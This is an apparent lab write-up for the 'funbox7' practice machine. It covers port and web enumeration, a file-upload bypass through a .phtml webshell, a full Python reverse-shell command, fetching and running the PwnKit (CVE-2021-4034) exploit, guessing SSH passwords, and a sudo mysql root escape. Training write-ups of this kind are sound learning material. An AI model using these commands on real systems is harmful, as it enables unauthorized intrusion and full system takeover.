
## Lab Details
- Difficulty: Intermediate
- OS: Linux
- Foothold time: 1 hour
- Privesc time: 1 hour and 6 minutes
- Total solve time: 2 Hour 12 Minutes 

## Summary
- Initial access: File upload 
- Privilege escalation: CVE-2021-4034

## Enumeration
- Key findings: Identified open ports on target
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
##### Steps
## Foothold
- Path:

##### Steps
- run `ffuf` to enumerate endpoints
```
$ ffuf -u http://192.168.55.132/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php
<SNIP>
mini.php                [Status: 200, Size: 3828, Words: 152, Lines: 115, Duration: 1ms]
<SNIP>
```
- identified `mini.php`
![[Pasted image 20260406012655.png]]
- file upload can be bypassed using extensions like `phtml`
- upload a webshell and obtain reverse shell 
![[Pasted image 20260406012712.png]]
- prepare reverse shell payload 
```
http://192.168.55.132/webshell.phtml?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.55",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
- reverse shell obtain as user `www-data`
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.132] 39850
www-data@funbox7:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Privilege Escalation
- Path: Privilege Escalation via Pwnkit

##### Steps
- load and run `linpeas.sh`
- found its vulnerable to Pwnkit
```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```
- download and execute Pwnkit
```
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
```

##### Intended Way
- Try simple login combinations with users on the taret
```
goat:goat
harry:harry
karla:karla
oracle:oracle
sally:sally
```
- found `goat` has password `goat`
```
$ ssh goat@192.168.120.148
goat@192.168.120.148's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)
...
goat@funbox7:~$ id
uid=1003(goat) gid=1003(goat) groups=1003(goat),111(ssh)
```
- identified elevated sudo right
```
goat@funbox7:~$ sudo -l
Matching Defaults entries for goat on funbox7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goat may run the following commands on funbox7:
    (root) NOPASSWD: /usr/bin/mysql
```
- use `mysql` to get root shell, command in `gtfo.bin`
```
goat@funbox7:~$ whoami
goat
goat@funbox7:~$ sudo /usr/bin/mysql -e '\! /bin/sh'
# whoami
root
```
## Lessons Learned
- Attack family: Web Exploit, Linux Privilege Escalation via Pwnkit
- Key takeaway:
	- Fuzz against extensions
	- Try suggested exploits by `linpeas`
	- Need to use checklist when unable to proceed rather than relay purely on memory 
##### Steps

## Resources
- References: